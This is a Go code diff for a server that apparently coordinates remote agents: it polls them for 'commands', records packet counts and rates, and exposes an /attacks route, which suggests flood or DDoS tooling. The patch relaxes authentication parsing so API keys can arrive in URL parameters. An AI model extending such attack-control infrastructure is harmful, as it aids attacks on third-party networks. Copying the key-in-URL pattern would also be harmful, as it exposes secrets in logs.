@@ -411,9 +411,21 @@ func serverHeartbeat(w http.ResponseWriter, r *http.Request) {
 		PacketsRate uint64 `json:"packetsRate"`
 	}
 
+	// 从请求体解析数据
 	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		return
+		// 如果请求体解析失败，尝试从URL参数获取
+		if idStr := r.URL.Query().Get("serverId"); idStr != "" {
+			fmt.Sscanf(idStr, "%d", &data.ServerID)
+		}
+		if key := r.URL.Query().Get("apiKey"); key != "" {
+			data.APIKey = key
+		}
+		
+		// 如果尝试获取URL参数后仍未获得有效数据，则返回错误
+		if data.ServerID == 0 || data.APIKey == "" {
+			http.Error(w, "缺少必要的参数: serverId和apiKey", http.StatusBadRequest)
+			return
+		}
 	}
 
 	appState.mu.Lock()
@@ -434,8 +446,14 @@ func serverHeartbeat(w http.ResponseWriter, r *http.Request) {
 	// 更新服务器状态
 	server.Status = ServerStatusOnline
 	server.LastSeen = time.Now()
-	server.PacketsSent = data.PacketsSent
-	server.PacketsRate = data.PacketsRate
+	
+	// 仅在值不为零时更新这些字段（避免覆盖URL参数情况下的空值）
+	if data.PacketsSent > 0 {
+		server.PacketsSent = data.PacketsSent
+	}
+	if data.PacketsRate > 0 {
+		server.PacketsRate = data.PacketsRate
+	}
 	appState.mu.Unlock()
 
 	// 广播更新
@@ -460,6 +478,24 @@ func getCommands(w http.ResponseWriter, r *http.Request) {
 	}
 	if key := r.URL.Query().Get("apiKey"); key != "" {
 		apiKey = key
+	}
+
+	// 如果查询参数中没有数据，尝试从请求体中获取
+	if (serverID == 0 || apiKey == "") && (r.Method == "POST" || r.Method == "PUT") {
+		var requestData struct {
+			ServerID int    `json:"serverId"`
+			APIKey   string `json:"apiKey"`
+		}
+
+		// 尝试解析JSON请求体
+		if err := json.NewDecoder(r.Body).Decode(&requestData); err == nil {
+			if serverID == 0 && requestData.ServerID != 0 {
+				serverID = requestData.ServerID
+			}
+			if apiKey == "" && requestData.APIKey != "" {
+				apiKey = requestData.APIKey
+			}
+		}
 	}
 
 	// 验证服务器ID和API密钥
@@ -624,8 +660,8 @@ func main() {
 	api.HandleFunc("/attacks", getAttacks).Methods("GET")
 	
 	// 代理API - 需要API密钥验证
-	api.HandleFunc("/heartbeat", serverHeartbeat).Methods("POST")
-	api.HandleFunc("/commands", getCommands).Methods("GET")
+	api.HandleFunc("/heartbeat", serverHeartbeat).Methods("POST", "GET")
+	api.HandleFunc("/commands", getCommands).Methods("GET", "POST")
 
 	// WebSocket连接
 	r.HandleFunc("/ws", handleWebSocket)
